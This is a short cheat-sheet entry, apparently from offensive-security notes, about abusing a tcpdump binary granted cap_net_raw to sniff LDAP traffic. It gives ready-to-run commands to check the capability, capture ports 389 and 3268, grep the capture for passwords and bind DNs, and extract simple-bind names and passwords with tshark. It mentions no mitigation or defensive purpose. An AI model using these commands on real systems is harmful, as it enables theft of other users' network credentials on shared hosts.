# tcpdump cap_net_raw LDAP Sniff

If `tcpdump` has `cap_net_raw` set (common on shared lab/dev boxes), any user can capture all network traffic — including LDAP plaintext credentials on port 389.

```bash
# check capability
getcap $(which tcpdump)   # should show cap_net_raw+eip

# capture LDAP (port 389) and dump to file
tcpdump -i <iface> -w /tmp/ldap.pcap port 389 &
# after some idle time, kill and analyze
tcpdump -r /tmp/ldap.pcap -A | grep -iE 'uid|password|bindDN|CN='
```

LDAP simple bind sends the DN and password in cleartext. Even LDAP/636 (LDAPS) will appear encrypted, but port 389 is the target. Also capture 3268 (Global Catalog) which is equally cleartext.

Use tshark for cleaner extraction:
```bash
tshark -r /tmp/ldap.pcap -Y 'ldap.bindRequest' -T fields -e ldap.name -e ldap.simple
```
